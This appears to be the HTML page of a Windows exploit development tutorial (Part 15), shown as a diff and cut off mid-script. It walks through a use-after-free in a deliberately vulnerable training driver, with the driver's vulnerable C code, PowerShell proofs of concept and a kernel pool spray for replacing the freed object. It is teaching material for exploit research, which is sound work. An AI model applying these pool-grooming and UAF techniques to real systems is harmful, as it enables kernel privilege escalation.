@@ -1,0 +1,1092 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Windows ExploitDev: Part 15</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+    
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../../js/shCore.js"></script>
+	<script type="text/javascript" src="../../js/shBrushCpp.js"></script>
+	<script type="text/javascript" src="../../js/shBrushPowerShell.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../../index.html">Home</a>
+            </li>
+            <li><a href="../../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../../coding.html">Scripting</a>
+            </li>
+            <li><a href="../../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../../links.html">Links</a>
+            </li>
+            <li><a href="../../patreon.html">Patreon</a></li><li><a href="../../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Kernel Exploitation: UAF</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Part 15: Kernel Exploitation -> UAF<span class="line"></span></h2>
+        <p>Hola, and welcome back to part 15 of the Windows exploit development tutorial series. Today we have another post on pwning <a href="https://twitter.com/HackSysTeam">@HackSysTeam's</a> extreme vulnerable driver. In this post we will be exploiting the Use-After-Free vulnerability, in what will be the first of the "complex" vuln classes! I recommend readers get a leg up and review the resources listed below as they provide a comprehensive explanation of kernel pool memory and reserve objects. For more details on setting up the debugging environment see <a href="http://www.fuzzysecurity.com/tutorials/expDev/14.html">part 10</a>.<br /><br />
+      
+      <span style="color: #ffffff;"><strong>Resources:</strong></span><br />
+      + HackSysExtremeVulnerableDriver (<a href="https://twitter.com/HackSysTeam">@HackSysTeam</a>) - <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">here</a><br />
+	  + HackSysTeam-PSKernelPwn (<a href="https://twitter.com/FuzzySec">@FuzzySec</a>) - <a href="https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn">here</a><br />
+	  + Kernel Pool Exploitation on Windows 7 (Tarjei Mandt) - <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">here</a><br />
+	  + Reserve Objects in Windows 7 (<a href="https://twitter.com/j00ru">@j00ru</a>) - <a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf">here</a><br /></p><br />
+	  
+<div class="fourteen columns bottom">
+<h2 class="title">Recon the challenge<span class="line"></span></h2>
+<p>The recon portion of this post is slightly different as there are a number of driver functions involved in the UAF vulnerability. We will look at each of them in turn as provide such detail as is appropriate.<br /><br />
+
+<span style="color: #ffffff;"><strong>AllocateUaFObject</strong></span><br /></p>
+	  
+    <div class="main_wrap_support">
+<pre class="brush: c;gutter:false;auto-links: false;;">
+NTSTATUS AllocateUaFObject() {
+    NTSTATUS Status = STATUS_SUCCESS;
+    PUSE_AFTER_FREE UseAfterFree = NULL;
+
+    PAGED_CODE();
+
+    __try {
+        DbgPrint("[+] Allocating UaF Object\n");
+
+        // Allocate Pool chunk
+        UseAfterFree = (PUSE_AFTER_FREE)ExAllocatePoolWithTag(NonPagedPool,
+                                                              sizeof(USE_AFTER_FREE),
+                                                              (ULONG)POOL_TAG);
+
+        if (!UseAfterFree) {
+            // Unable to allocate Pool chunk
+            DbgPrint("[-] Unable to allocate Pool chunk\n");
+
+            Status = STATUS_NO_MEMORY;
+            return Status;
+        }
+        else {
+            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
+            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
+            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(USE_AFTER_FREE));
+            DbgPrint("[+] Pool Chunk: 0x%p\n", UseAfterFree);
+        }
+
+        // Fill the buffer with ASCII 'A'
+        RtlFillMemory((PVOID)UseAfterFree->Buffer, sizeof(UseAfterFree->Buffer), 0x41);
+
+        // Null terminate the char buffer
+        UseAfterFree->Buffer[sizeof(UseAfterFree->Buffer) - 1] = '\0';
+
+        // Set the object Callback function
+        UseAfterFree->Callback = &UaFObjectCallback;
+
+        // Assign the address of UseAfterFree to a global variable
+        g_UseAfterFreeObject = UseAfterFree;
+
+        DbgPrint("[+] UseAfterFree Object: 0x%p\n", UseAfterFree);
+        DbgPrint("[+] g_UseAfterFreeObject: 0x%p\n", g_UseAfterFreeObject);
+        DbgPrint("[+] UseAfterFree->Callback: 0x%p\n", UseAfterFree->Callback);
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+
+    return Status;
+}</pre>
+</div>
+    
+<p>&nbsp;</p>
+<p>The function allocates a non-paged pool chunk, fills it with A's, prepends a callback pointer and adds a null terminator. Pretty much the same story in IDA, the screenshot below can be used for reference. Notice the object size is 0x58 bytes and the pool tag is "Hack" (little endian).</p>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_1.png">
+<p>&nbsp;</p>
+
+<p>We can use the following PowerShell POC to call the function.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+  
+    [DllImport("kernel32.dll")]
+    public static extern uint GetLastError();
+}
+"@
+  
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+ 
+# 0x222013 - HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT
+[EVD]::DeviceIoControl($hDevice, 0x222013, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_2.png">
+<p>&nbsp;</p>
+
+<p><span style="color: #ffffff;"><strong>FreeUaFObject</strong></span><br /></p>
+
+    <div class="main_wrap_support">
+<pre class="brush: c;gutter:false;auto-links: false;;">
+NTSTATUS FreeUaFObject() {
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+    PAGED_CODE();
+
+    __try {
+        if (g_UseAfterFreeObject) {
+            DbgPrint("[+] Freeing UaF Object\n");
+            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
+            DbgPrint("[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObject);
+
+#ifdef SECURE
+            // Secure Note: This is secure because the developer is setting
+            // 'g_UseAfterFreeObject' to NULL once the Pool chunk is being freed
+            ExFreePoolWithTag((PVOID)g_UseAfterFreeObject, (ULONG)POOL_TAG);
+
+            g_UseAfterFreeObject = NULL;
+#else
+            // Vulnerability Note: This is a vanilla Use After Free vulnerability
+            // because the developer is not setting 'g_UseAfterFreeObject' to NULL.
+            // Hence, g_UseAfterFreeObject still holds the reference to stale pointer
+            // (dangling pointer)
+            ExFreePoolWithTag((PVOID)g_UseAfterFreeObject, (ULONG)POOL_TAG);
+#endif
+
+            Status = STATUS_SUCCESS;
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+
+    return Status;
+}</pre>
+</div>
+
+
+<p>Fairly straight forward, this frees the pool chunk by referencing the tag value. This is the function that contains the vulnerability in that "g_UseAfterFreeObject" is not set to null after the object is freed and so retains a stale object pointer. Again let's quickly try that with the following POC.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+  
+    [DllImport("kernel32.dll")]
+    public static extern uint GetLastError();
+}
+"@
+  
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+ 
+# 0x22201B - HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT
+[EVD]::DeviceIoControl($hDevice, 0x22201B, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_3.png">
+<p>&nbsp;</p>
+
+<p>Notice that the pool chunk address is the same as the one we allocated above.<br /><br />
+
+<span style="color: #ffffff;"><strong>UseUaFObject</strong></span><br /></p>
+
+    <div class="main_wrap_support">
+<pre class="brush: c;gutter:false;auto-links: false;;">
+NTSTATUS UseUaFObject() {
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+    PAGED_CODE();
+
+    __try {
+        if (g_UseAfterFreeObject) {
+            DbgPrint("[+] Using UaF Object\n");
+            DbgPrint("[+] g_UseAfterFreeObject: 0x%p\n", g_UseAfterFreeObject);
+            DbgPrint("[+] g_UseAfterFreeObject->Callback: 0x%p\n", g_UseAfterFreeObject->Callback);
+            DbgPrint("[+] Calling Callback\n");
+
+            if (g_UseAfterFreeObject->Callback) {
+                g_UseAfterFreeObject->Callback();
+            }
+
+            Status = STATUS_SUCCESS;
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+
+    return Status;
+}</pre>
+</div>
+
+<p>This function reads in the "g_UseAfterFreeObject" value and executes the object callback. If we call this function with the following POC we essentially end up calling volatile memory because the system is free to re-purpose the, previously freed, pool chunk for whatever reason it sees fit.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+  
+    [DllImport("kernel32.dll")]
+    public static extern uint GetLastError();
+}
+"@
+  
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+ 
+# 0x222017 - HACKSYS_EVD_IOCTL_USE_UAF_OBJECT
+[EVD]::DeviceIoControl($hDevice, 0x222017, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>&nbsp;</p>
+<p><span style="color: #ffffff;"><strong>AllocateFakeObject</strong></span><br /><br />
+Finally, and slightly contrived, we have a driver function which allows us to allocate a fake object on the non-paged pool. Highly convenient as this function allows us to allocate objects identical to the original UAF object.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: c;gutter:false;auto-links: false;;">
+NTSTATUS AllocateFakeObject(IN PFAKE_OBJECT UserFakeObject) {
+    NTSTATUS Status = STATUS_SUCCESS;
+    PFAKE_OBJECT KernelFakeObject = NULL;
+
+    PAGED_CODE();
+
+    __try {
+        DbgPrint("[+] Creating Fake Object\n");
+
+        // Allocate Pool chunk
+        KernelFakeObject = (PFAKE_OBJECT)ExAllocatePoolWithTag(NonPagedPool,
+                                                               sizeof(FAKE_OBJECT),
+                                                               (ULONG)POOL_TAG);
+
+        if (!KernelFakeObject) {
+            // Unable to allocate Pool chunk
+            DbgPrint("[-] Unable to allocate Pool chunk\n");
+
+            Status = STATUS_NO_MEMORY;
+            return Status;
+        }
+        else {
+            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
+            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
+            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(FAKE_OBJECT));
+            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelFakeObject);
+        }
+
+        // Verify if the buffer resides in user mode
+        ProbeForRead((PVOID)UserFakeObject, sizeof(FAKE_OBJECT), (ULONG)__alignof(FAKE_OBJECT));
+
+        // Copy the Fake structure to Pool chunk
+        RtlCopyMemory((PVOID)KernelFakeObject, (PVOID)UserFakeObject, sizeof(FAKE_OBJECT));
+
+        // Null terminate the char buffer
+        KernelFakeObject->Buffer[sizeof(KernelFakeObject->Buffer) - 1] = '\0';
+
+        DbgPrint("[+] Fake Object: 0x%p\n", KernelFakeObject);
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+
+    return Status;
+}</pre>
+</div>
+
+<p>&nbsp;</p>
+<p>The POC to call this function is shown below. Notice that, here, we do need to craft a buffer and supply an input length.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+  
+    [DllImport("kernel32.dll")]
+    public static extern uint GetLastError();
+}
+"@
+  
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+ 
+# 0x22201F - HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT
+$Buffer = [Byte[]](0x41)*0x4 + [Byte[]](0x42)*0x5B + 0x00 # len 0x60
+[EVD]::DeviceIoControl($hDevice, 0x22201F, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_4.png">
+<p>&nbsp;</p>
+
+<h2 class="title">Pwn all the things!<span class="line"></span></h2>
+<p><span style="color: #ffffff;"><strong>Game Plan</strong></span><br /><br />
+Ok, the basic principle is straight forward. We (1) allocate the UAF object, (2) we free the UAF object, (3) we replace the pool chunk with our fake object, (4) we call the stale UAF pointer and end up executing code with the callback function from our fake object. Nice and simple!<br /><br />
+
+The only issues we may face here are memory alignment and pool chunk coalescing, again I recommend you read Tarjei's <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">paper</a>. Essentially, if we free the UAF object and it is adjacent to other free pool chunks then the allocator will coalesce these chunks for performance reasons. If this happens it will be highly unlikely that we can replace the UAF object with our own fake object. To avoid this we need to get the non-paged pool in a predictable state and force the driver to allocate the UAF object in a location we can reliably overwrite later!<br /><br />
+
+<span style="color: #ffffff;"><strong>Derandomize the Non-Paged Pool</strong></span><br /><br />
+Our first objective here is to fill in, as best as possible, all the empty spaces at the "start" of the non-paged kernel pool. To do this we will create a ton of objects with a size close to our UAF object. IoCompletionReserve objects are a perfect candidate for this as they are allocated on the non-paged pool and have a size of 0x60!<br /><br />
+
+First, let's have a look at the IoCompletionReserve object type before we spray the pool (object types can be listed with => "!object \ObjectTypes").</p>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_5.png">
+<p>&nbsp;</p>
+
+<p>We can use the NtAllocateReserveObject function to create IoCo objects. This function returns a handle to the created object and as long as we don't release the handle, the object will remain allocated in the pool. In the POC below I am spraying these objects in two sittings, (1) x10000 objects to fill in the fragmented pool space and (2) x5000 which should hopefully be consecutive.<br /><br />
+
+For debugging purposes the script dumps the last 10 handles to stdout and then automatically initializes a breakpoint in WinDBG.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern Byte CloseHandle(
+    	IntPtr hObject);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern int NtAllocateReserveObject(
+    	ref IntPtr hObject,
+		UInt32  ObjectAttributes,
+		UInt32 ObjectType);
+		
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern void DebugBreak();
+}
+"@
+
+function IoCo-PoolSpray {
+	echo "[+] Derandomizing NonPagedPool.."
+	$Spray = @()
+	for ($i=0;$i -lt 10000;$i++) {
+		$hObject = [IntPtr]::Zero
+		$CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
+		if ($CallResult -eq 0) {
+			$Spray += $hObject
+		}
+	}
+	$Script:IoCo_hArray1 += $Spray
+	echo "[+] $($IoCo_hArray1.Length) IoCo objects created!"
+
+	echo "[+] Allocating sequential objects.."
+	$Spray = @()
+	for ($i=0;$i -lt 5000;$i++) {
+		$hObject = [IntPtr]::Zero
+		$CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
+		if ($CallResult -eq 0) {
+			$Spray += $hObject
+		}
+	}
+	$Script:IoCo_hArray2 += $Spray
+	echo "[+] $($IoCo_hArray2.Length) IoCo objects created!"
+}
+
+echo "`n[>] Spraying non-paged kernel pool!"
+IoCo-PoolSpray
+
+echo "`n[>] Last 10 object handles:"
+for ($i=1;$i -lt 11; $i++) {
+	"{0:X}" -f $($($IoCo_hArray2[-$i]).ToInt64())
+}
+
+echo "`n[>] Triggering WinDBG breakpoint.."
+[EVD]::DebugBreak()</pre>
+</div>
+
+<p>You should see something like this and hit a breakpoint in WinDBG.</p>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_6.png">
+<p>&nbsp;</p>
+
+<p>If we take another look at the IoCompletionReserve type we can see we did in fact allocate 15000 objects!</p>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_7.png">
+<p>&nbsp;</p>
+
+<p>Let's inspect one of the handles we dumped to stdout.</p>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_8.png">
+<p>&nbsp;</p>
+
+<p>As expected, it's an IoCompletionReserve object. Also, considering this is one of the last handles of our spray, we should have consecutive allocations on the non-paged pool.</p>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_9.png">
+<p>&nbsp;</p>
+
+<p>Woot, we can see the size of our object is 0x60 (96) bytes and some stable consecutive allocations! As a final step we will add a routine to our POC to free every second IoCompletionReserve object from our second allocation (2500 in total) to create holes in the non-paged pool!</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern Byte CloseHandle(
+    	IntPtr hObject);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern int NtAllocateReserveObject(
+    	ref IntPtr hObject,
+		UInt32  ObjectAttributes,
+		UInt32 ObjectType);
+		
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern void DebugBreak();
+}
+"@
+
+function IoCo-PoolSpray {
+	echo "[+] Derandomizing NonPagedPool.."
+	$Spray = @()
+	for ($i=0;$i -lt 10000;$i++) {
+		$hObject = [IntPtr]::Zero
+		$CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
+		if ($CallResult -eq 0) {
+			$Spray += $hObject
+		}
+	}
+	$Script:IoCo_hArray1 += $Spray
+	echo "[+] $($IoCo_hArray1.Length) IoCo objects created!"
+
+	echo "[+] Allocating sequential objects.."
+	$Spray = @()
+	for ($i=0;$i -lt 5000;$i++) {
+		$hObject = [IntPtr]::Zero
+		$CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
+		if ($CallResult -eq 0) {
+			$Spray += $hObject
+		}
+	}
+	$Script:IoCo_hArray2 += $Spray
+	echo "[+] $($IoCo_hArray2.Length) IoCo objects created!"
+
+	echo "[+] Creating non-paged pool holes.."
+	for ($i=0;$i -lt $($IoCo_hArray2.Length);$i+=2) {
+		$CallResult = [EVD]::CloseHandle($IoCo_hArray2[$i])
+		if ($CallResult -ne 0) {
+			$FreeCount += 1
+		}
+	}
+	echo "[+] Free'd $FreeCount IoCo objects!"
+}
+
+echo "`n[>] Spraying non-paged kernel pool!"
+IoCo-PoolSpray
+
+echo "`n[>] Last 10 object handles:"
+for ($i=1;$i -lt 11; $i++) {
+	"{0:X}" -f $($($IoCo_hArray2[-$i]).ToInt64())
+}
+
+echo "`n[>] Triggering WinDBG breakpoint.."
+[EVD]::DebugBreak()</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_10.png">
+<p>&nbsp;</p>
+
+<p>These 2500 free 0x60-byte pool chunks are now in a predictable location and each of them is surrounded by two allocated chunks which prevents them from coalescing into odd sizes!<br /><br />
+
+<span style="color: #ffffff;"><strong>Gain Control Over EIP</strong></span><br /><br />
+Time to put things together as per our game plan.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern Byte CloseHandle(
+    	IntPtr hObject);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern int NtAllocateReserveObject(
+    	ref IntPtr hObject,
+		UInt32  ObjectAttributes,
+		UInt32 ObjectType);
+  
+    [DllImport("kernel32.dll")]
+    public static extern uint GetLastError();
+}
+"@
+
+function IoCo-PoolSpray {
